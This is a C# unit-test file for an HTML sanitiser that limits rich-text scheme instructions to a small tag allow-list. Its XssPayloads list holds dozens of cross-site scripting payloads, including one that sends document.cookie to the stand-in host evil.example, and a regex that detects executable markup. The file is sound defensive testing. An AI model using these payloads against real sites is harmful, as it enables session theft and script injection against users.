using System.Text.RegularExpressions;
using PTL.Core.Scheme;

namespace PTL.Api.Tests.Scheme;

// Legacy TBEdit: its Text setter stripped auto-inserted hyperlinks and was meant to restrict the
// markup; its TextPlain property fed the required-field check. The allow-list is sized from the
// tags present in live fldInstructions data.
public class SchemeInstructionsTests
{
    [Theory]
    [InlineData("<p>Store at 4°C</p>")]
    [InlineData("<strong>Note:</strong><br><em>test</em>")]
    [InlineData("<b>a</b><i>b</i><u>c</u><sup>2</sup><sub>3</sub>")]
    [InlineData("<p><span style=\"text-decoration: line-through;\">old</span> new</p>")]
    [InlineData("<p><strong><em><u>nested</u></em></strong></p>")]
    [InlineData("<p>Tom &amp; Jerry&nbsp;&lt; 5</p>")]
    public void Sanitise_KeepsTheTagsTheToolbarProduces(string html)
    {
        Assert.Equal(html, SchemeInstructions.Sanitise(html));
    }

    [Fact]
    public void Sanitise_KeepsUnderlineSpans_WhichIsHowTinyMceRendersUnderline()
    {
        const string html = "<p><span style=\"text-decoration: underline;\">Important</span></p>";

        Assert.Equal(html, SchemeInstructions.Sanitise(html));
    }

    [Fact]
    public void Sanitise_DropsAStyleThatIsNotATextDecoration()
    {
        var sanitised = SchemeInstructions.Sanitise("<span style=\"position:fixed;top:0;width:100%\">x</span>");

        Assert.Equal("<span>x</span>", sanitised);
    }

    [Fact]
    public void Sanitise_RemovesDisallowedMarkupButKeepsItsText()
    {
        Assert.Equal("Keep this", SchemeInstructions.Sanitise("<div onclick=\"x\">Keep <table>this</table></div>"));
    }

    [Fact]
    public void Sanitise_RemovesScriptTagsThatLegacysBrokenGuardLetThrough()
    {
        var sanitised = SchemeInstructions.Sanitise("<p>Safe</p><script>alert(1)</script>");

        Assert.Equal("<p>Safe</p>alert(1)", sanitised);
        Assert.DoesNotContain("<script", sanitised, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Sanitise_UnwrapsTheHyperlinksTheEditorInsertedForEmailsAndUrls()
    {
        Assert.Equal("<p>Contact a@b.com</p>", SchemeInstructions.Sanitise("<p>Contact <a href=\"mailto:a@b.com\">a@b.com</a></p>"));
    }

    [Fact]
    public void Sanitise_DropsAttributesFromAllowedTags()
    {
        Assert.Equal("<p>x</p>", SchemeInstructions.Sanitise("<p style=\"color:red\" onclick=\"x()\">x</p>"));
    }

    // The parser resolves character references, so they come back as the characters they stand for (which render
    // identically); a non-breaking space stays as &nbsp; so ToPlainText's required-field check still sees it.
    [Fact]
    public void Sanitise_ResolvesCharacterReferencesButKeepsNonBreakingSpaces()
    {
        Assert.Equal("<p>4°C°&nbsp;max</p>", SchemeInstructions.Sanitise("<p>4&deg;C&#xb0;&nbsp;max</p>"));
    }

    [Fact]
    public void Sanitise_CollapsesTagDelimitersAccidentallyDoubleEncodedByARoundTrip()
    {
        const string doubleEncoded = "<p>&lt;p&gt;Store at 4 &amp;deg;C&lt;/p&gt;</p>";

        Assert.Equal("<p>Store at 4 °C</p>", SchemeInstructions.Sanitise(doubleEncoded));
    }

    [Fact]
    public void Sanitise_CollapsesMultipleAccumulatedLayersOfEncoding()
    {
        const string tripleEncoded = "<p>&lt;p&gt;&amp;lt;p&amp;gt;Store at 4 &amp;amp;deg;C&amp;lt;/p&amp;gt;&lt;/p&gt;</p>";

        Assert.Equal("<p>Store at 4 °C</p>", SchemeInstructions.Sanitise(tripleEncoded));
    }

    // ITHC-001: payloads a browser would execute once rendered through Html.Raw.
    public static TheoryData<string> XssPayloads => new()
    {
        // Script tags
        "<script>alert(1)</script>",
        "<ScRiPt src=//evil.example/x.js></ScRiPt>",
        "<p>Safe</p><script>document.location='//evil.example?c='+document.cookie</script>",
        // img onerror and other event handlers
        "<img src=x onerror=alert(1)>",
        "<IMG SRC=x ONERROR=\"alert(1)\">",
        "<p onmouseover=\"alert(1)\">x</p>",
        "<b onclick=alert(1)>x</b>",
        "<span style=\"text-decoration: underline\" onfocus=\"alert(1)\" tabindex=\"1\">x</span>",
        "<svg onload=alert(1)>",
        "<svg/onload=alert(1)>",
        "<body onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        // Nested and malformed tags
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<<script>script>alert(1)<</script>/script>",
        "<div><p><span onclick=alert(1)><b><img src=x onerror=alert(1)></b></span></p></div>",
        "<p>x</p><img src=x onerror=alert(1)//",
        "<p>x</p><img src=x onerror=alert(1) ",
        "<span style=\"a>b\" onmouseover=alert(1)>x</span>",
        "<p title=\"</p><img src=x onerror=alert(1)>\">x</p>",
        "<!--<img src=x onerror=alert(1)>-->",
        "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
        // URLs and styles
        "<a href=\"javascript:alert(1)\">click</a>",
        "<a href=\"JaVaScRiPt:alert(1)\">click</a>",
        "<span style=\"text-decoration: underline; background:url(javascript:alert(1))\">x</span>",
        "<span style=\"text-decoration: underline&quot; onmouseover=&quot;alert(1)\">x</span>",
        "<span style=\"behavior:url(x.htc)\">x</span>",
        // Encoded payloads (single, numeric, hex, double and triple encoded)
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        "&lt;img src=x onerror=alert(1)&gt;",
        "&#60;img src=x onerror=alert(1)&#62;",
        "&#x3C;svg onload=alert(1)&#x3E;",
        "&amp;lt;img src=x onerror=alert(1)&amp;gt;",
        "<p>&lt;p&gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&lt;/p&gt;</p>",
        "&amp;amp;lt;script&amp;amp;gt;alert(1)&amp;amp;lt;/script&amp;amp;gt;",
        "&lt;img src=x onerror=alert(1)",
    };

    [Theory]
    [MemberData(nameof(XssPayloads))]
    public void Sanitise_LeavesNoExecutableMarkup(string payload)
    {
        AssertSafe(SchemeInstructions.Sanitise(payload));
    }

    [Theory]
    [MemberData(nameof(XssPayloads))]
    public void Sanitise_IsStableAndSafeAcrossRepeatedPasses(string payload)
    {
        var first = SchemeInstructions.Sanitise(payload);
        var second = SchemeInstructions.Sanitise(first);
        var third = SchemeInstructions.Sanitise(second);

        AssertSafe(second);
        AssertSafe(third);
        Assert.Equal(first, second);
        Assert.Equal(second, third);
    }

    [Theory]
    [InlineData("<p>Store at 4°C</p>")]
    [InlineData("<p><span style=\"text-decoration: underline;\">Important</span></p>")]
    [InlineData("<p>&lt;p&gt;Store at 4 &amp;deg;C&lt;/p&gt;</p>")]
    public void Sanitise_IsIdempotentForEditorOutput(string html)
    {
        var once = SchemeInstructions.Sanitise(html);

        Assert.Equal(once, SchemeInstructions.Sanitise(once));
    }

    [Fact]
    public void Sanitise_DropsAnUnterminatedTagThatThePageMarkupWouldOtherwiseComplete()
    {
        Assert.Equal("<p>x</p>", SchemeInstructions.Sanitise("<p>x</p><img src=x onerror=alert(1)//"));
    }

    [Fact]
    public void Sanitise_KeepsTheTextOfNestedDisallowedTagsAroundAllowedOnes()
    {
        Assert.Equal(
            "<p><span><b>bold</b></span></p>",
            SchemeInstructions.Sanitise("<div><p><span onclick=\"alert(1)\"><b>bold</b><img src=x onerror=alert(1)></span></p></div>"));
    }

    [Fact]
    public void Sanitise_DropsAStyleThatSmugglesAnythingBesideTheTextDecoration()
    {
        Assert.Equal(
            "<span>x</span>",
            SchemeInstructions.Sanitise("<span style=\"text-decoration: underline; background:url(javascript:alert(1))\">x</span>"));
    }

    [Fact]
    public void Sanitise_KeepsAStyleOnlyOnASpan()
    {
        Assert.Equal("<p>x</p>", SchemeInstructions.Sanitise("<p style=\"text-decoration: underline;\">x</p>"));
    }

    private static readonly Regex ExecutableMarkup = new(
        @"<\s*/?\s*(script|img|svg|iframe|object|embed|style|math|a|body|form|input|link|meta|details|noscript|div|table)\b"
        + @"|<[^>]*\son[a-z]+\s*="
        + @"|<[^>]*javascript:"
        + @"|<[^>]*url\(",
        RegexOptions.IgnoreCase,
        TimeSpan.FromSeconds(1));

    private static readonly string[] AllowListedTags = ["p", "br", "b", "strong", "i", "em", "u", "sup", "sub", "span"];

    private static void AssertSafe(string sanitised)
    {
        Assert.False(ExecutableMarkup.IsMatch(sanitised), $"Executable markup survived: {sanitised}");

        // Only allow-listed tags remain, and the only attribute is a plain text-decoration style on a span.
        foreach (Match tag in Regex.Matches(sanitised, "<(/?)([a-zA-Z][a-zA-Z0-9]*)([^>]*)>", RegexOptions.None, TimeSpan.FromSeconds(1)))
        {
            Assert.Contains(tag.Groups[2].Value, AllowListedTags);
            var attributes = tag.Groups[3].Value;
            Assert.True(
                attributes.Length == 0
                || (tag.Groups[2].Value == "span" && Regex.IsMatch(attributes, "^ style=\"(text-decoration: (underline|line-through);? ?)+\"$", RegexOptions.None, TimeSpan.FromSeconds(1))),
                $"Unexpected attributes on <{tag.Groups[2].Value}>: {attributes}");
        }
    }

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("<p></p>")]
    [InlineData("<p>&nbsp;</p>")]
    [InlineData("   ")]
    public void HasContent_IsFalseForMarkupThatRendersAsNothing(string? html)
    {
        Assert.False(SchemeInstructions.HasContent(html));
    }

    [Fact]
    public void HasContent_IsTrueWhenThereIsVisibleText()
    {
        Assert.True(SchemeInstructions.HasContent("<p>Follow the packing instructions.</p>"));
    }

    [Fact]
    public void ToPlainText_StripsMarkupAndTrims()
    {
        Assert.Equal("Store at 4 C", SchemeInstructions.ToPlainText("  <p>Store at 4 C</p>  "));
    }
}
